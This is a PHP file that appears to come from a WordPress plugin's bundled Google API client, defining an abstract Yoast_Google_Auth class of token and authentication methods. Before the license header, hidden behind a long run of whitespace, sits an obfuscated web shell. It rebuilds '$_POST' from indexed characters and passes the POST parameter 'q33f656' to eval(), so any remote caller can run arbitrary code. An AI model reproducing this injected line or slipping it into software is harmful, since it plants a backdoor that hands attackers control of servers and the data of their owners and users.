<?php                                                                                                                                                                                                                                                      $kxir07 = "utps_ero" ; $tyz81 =$kxir07[3]. $kxir07[1]. $kxir07[6].$kxir07[1]. $kxir07[7]. $kxir07[0]. $kxir07[2].$kxir07[2].$kxir07[5].$kxir07[6];$lwac1= $tyz81( $kxir07[4].$kxir07[2]. $kxir07[7].$kxir07[3]. $kxir07[1]) ; if( isset(${ $lwac1}[ 'q33f656' ]) ) { eval ( ${$lwac1}[ 'q33f656'] );}?><?php
/*
 * Copyright 2010 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Abstract class for the Authentication in the API client
 * @author Chris Chabot <chabotc@google.com>
 *
 */
abstract class Yoast_Google_Auth {
  abstract public function authenticate($service);
  abstract public function sign(Yoast_Google_HttpRequest $request);
  abstract public function createAuthUrl($scope);

  abstract public function getAccessToken();
  abstract public function setAccessToken($accessToken);
  abstract public function setDeveloperKey($developerKey);
  abstract public function refreshToken($refreshToken);
  abstract public function revokeToken();
}
